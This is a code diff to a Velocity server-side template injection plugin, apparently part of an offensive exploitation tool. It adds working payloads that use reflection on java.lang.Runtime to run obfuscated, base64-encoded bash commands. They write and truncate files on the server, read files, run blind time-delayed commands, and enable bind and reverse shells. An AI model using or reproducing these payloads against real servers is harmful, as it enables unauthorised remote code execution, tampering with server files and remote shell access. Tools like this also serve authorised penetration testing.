@@ -3,6 +3,7 @@ from core.plugin import Plugin
 from core import languages
 from utils import rand
 from utils.strings import quote
+import re
 
 class Velocity(Plugin):
 
@@ -12,22 +13,95 @@ class Velocity(Plugin):
             'header': '\n#set($h=%(header)s)\n${h}\n',
             'trailer': '\n#set($t=%(trailer)s)\n${t}\n'
         },
+        'write' : {
+            'call' : 'inject',
+            'write' : """#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+""",
+            'truncate' : """#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {echo,-n,}>%(path)s"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+"""
+        },
+        'read' : {
+            'call': 'execute',
+            'read' : """base64<'%(path)s'"""
+        },
+        'md5' : {
+            'call': 'execute',
+            'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
+        },
         'execute' : {
 
-           # I've tested the techniques described in this article
-           # http://blog.portswigger.net/2015/08/server-side-template-injection.html
-           # for it didn't work. Still keeping the check active to cover previous
-           # affected versions.
+           # This payload cames from henshin's contribution on 
+           # issue #9.
 
             'call': 'render',
-            'execute': """#set($str=$class.inspect("java.lang.String").type)
-    #set($chr=$class.inspect("java.lang.Character").type)
-    #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("%s"))
-    $ex.waitFor()
-    #set($out=$ex.getInputStream())
-    #foreach($i in [1..$out.available()])
-    $str.valueOf($chr.toChars($out.read()))
-    #end"""
+            'execute': """#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+""" 
+        },
+        'blind' : {
+            'call': 'execute_blind',
+            'bool_true' : 'true',
+            'bool_false' : 'false'
+        },
+        'execute_blind' : {
+            'call': 'inject',
+            'execute_blind': """#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+"""
+        },
+        'bind_shell' : {
+            'call' : 'execute_blind',
+            'bind_shell': languages.bash_bind_shell
+        },
+        'reverse_shell' : {
+            'call': 'execute_blind',
+            'reverse_shell' : languages.bash_reverse_shell
         }
     }
 
@@ -51,9 +125,9 @@ class Velocity(Plugin):
 
     def rendered_detected(self):
 
-        payload = '#* comm *#'
+        payload = 'a#* comm *#a'
 
-        if '' == self.render(payload):
+        if 'aa' == self.render(payload):
 
             # Since the render format is pretty peculiar assume
             # engine name if render has been detected.
@@ -62,8 +136,27 @@ class Velocity(Plugin):
 
             expected_rand = str(rand.randint_n(2))
             if expected_rand == self.execute('echo %s' % expected_rand):
+                
                 self.set('execute', True)
-
+                self.set('write', True)
+                self.set('read', True)
+                self.set('bind_shell', True)
+                self.set('reverse_shell', True)
+                
                 os = self.execute("""uname""")
                 if os and re.search('^[\w-]+$', os):
                     self.set('os', os)
+
+    def blind_detected(self):
+
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
+
+        # No blind code evaluation is possible here, only execution
+
+        # Since execution has been used to detect blind injection,
+        # let's assume execute_blind as set.
+        self.set('execute_blind', True)
+        self.set('write', True)
+        self.set('bind_shell', True)
+        self.set('reverse_shell', True)
